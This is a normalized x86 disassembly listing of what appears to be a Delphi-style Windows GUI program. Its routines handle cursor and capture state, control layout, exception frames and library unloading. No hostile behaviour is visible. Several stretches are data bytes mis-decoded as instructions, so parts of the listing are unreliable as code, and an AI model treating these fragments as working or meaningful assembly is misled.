mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44c298
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4387e8
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_438e68
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_448864
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_44b16c
jmp r-xdata
sub_438ecc
push ebx
mov ebx eax
mov eax ebx
call sub_44c074
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_437ca0
pop ebx
retn
sub_438ef8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44b580
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438f50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44b838
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_438e68
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_4499bc
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_449a00
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_438ff0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44b8e0
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4499bc
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_449a00
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_4391a8
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_438e68
mov eax ebx
mov si 0xffeb
call sub_403450
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_43913c
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_437c78
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439170
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_44d4f0
sub_4391a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_439170
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_4392a0
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439310
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_437ca0
mov eax ebx
call sub_438e68
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_439344
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_456898
sub_4393b4
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43943d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_461d58
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403450
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439444
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_439480
push ebx
push esi
mov esi eax
mov eax esi
call sub_44bce4
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_4394f4
push ebx
push esi
mov esi eax
mov eax esi
call sub_44bcfc
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_43955c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43910c
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_429380
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_423c94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41919c
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_429380
pop edx
call sub_4240b4
push 0x0
push edi
push 0x1
mov eax ebx
call sub_429380
mov edx eax
xor ecx ecx
mov eax esi
call sub_457c1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4395ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44be8c
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_439234
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43910c
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_457704
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_43955c
pop ecx
sub_4396a8
or al [ eax ]
add [ eax ] al
add al 0xfb
dec eax
add [ esp + eax + 0x49 ] bl
add [ eax ] al
add bl bh
dec eax
add [ ebx + eax ] bl
dec ecx
add [ eax ] al
add [ eax ] al
add ah bh
cli
dec eax
add [ eax + 0x4902 ] bl
add [ eax ] al
add al bh
cli
dec eax
add ah dl
add ecx [ ecx ]
add [ eax ] al
add [ eax ] al
hlt
sub_439a09
clc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439a7b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_439a43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45252c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a82
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_439a48
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_449fe8
call sub_403a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a82
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_439a8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_439d41
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_430118
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_42abbc
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_403ff8
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434c08
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_449fe8
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_435058
mov edx 0x6
mov eax ebx
call sub_435090
mov dx 0x1
mov eax ebx
call sub_4509f4
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fe80
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_449fe8
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_4494cc
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_438938
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_43910c
mov ecx r-xdata
mov edx [ rw-data ]
call sub_4297a0
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405ecc
xor edx edx
mov eax ebx
call sub_44a12c
mov dl 0x1
mov eax ebx
call sub_44a108
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434c08
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_449fe8
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_4494cc
mov dl 0x2
mov eax ebx
call sub_43503c
mov dl 0x1
mov eax ebx
call sub_435058
xor edx edx
mov eax ebx
call sub_4509f4
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434004
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_4494cc
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_434430
mov dl 0x1
mov eax ebx
call sub_434400
mov dl 0x1
mov eax ebx
call sub_4343d8
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d48
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
add esp 0xfffffff0
call sub_403578
sub_439d48
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_439f49
xor ebx ebx
call sub_403a5c
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_430318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fe7
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc8
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_449fe8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_4343f0
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_449fe8
sub_43a004
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43a0dc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_449978
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_449958
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_449728
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_4343f0
lea eax [ ebx + 0xcc ]
call sub_403fa4
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_449fe8
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_44ded4
mov eax ebx
call sub_430080
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a0e3
lea eax [ ebp - 0x34 ]
call sub_403fa4
retn
sub_43a11c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_43a383
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46331c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a366
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464160
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_449fe8
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_464ae0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_465140
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_434c08
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_449fe8
mov dl 0x5
mov eax ebx
call sub_4494cc
xor edx edx
mov eax ebx
call sub_435058
mov dl 0x1
mov eax ebx
call sub_4350ac
mov edx 0x5
mov eax ebx
call sub_435090
mov edx 0xff000005
mov eax ebx
call sub_44a158
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_434004
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_4494cc
mov dl 0x1
mov eax esi
call sub_434400
mov dl 0x1
mov eax esi
call sub_434430
mov dl 0x1
mov eax esi
call sub_4343d8
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_426d7c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a36d
mov eax [ ebp - 0x4 ]
call sub_403254
retn
mov eax [ ebp - 0x4 ]
call sub_4499bc
mov esi eax
mov eax ebx
call sub_4499bc
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_426d7c
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_464cb0
call sub_46842c
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_42b204
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_464100
mov eax [ ebp - 0x4 ]
call sub_449a00
mov esi eax
mov eax ebx
call sub_449a00
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_426d94
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_464cb0
call sub_4683f8
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_42b204
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_464130
add eax 0x3
sub_43a3d8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a423
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_42abbc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_4043b0
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a42a
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_43a430
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a455
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a45c
retn
sub_43a477
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43a4bc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a4c3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a58
sub_43a4df
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43a524
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a52b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a58
sub_43a53b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a591
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a598
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403fa4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43a5a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a5e8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a5ef
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43a5fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a621
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a628
retn
sub_43a634
and [ esi + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40043a6 ] cl
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0xa7
inc ebx
add [ eax ] ah
cmpsd [ esi ] [ edi ]
inc ebx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] al
add [ eax ] al
nop
push sub_43a7a3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a7aa
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a0c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43a734
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a7a3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
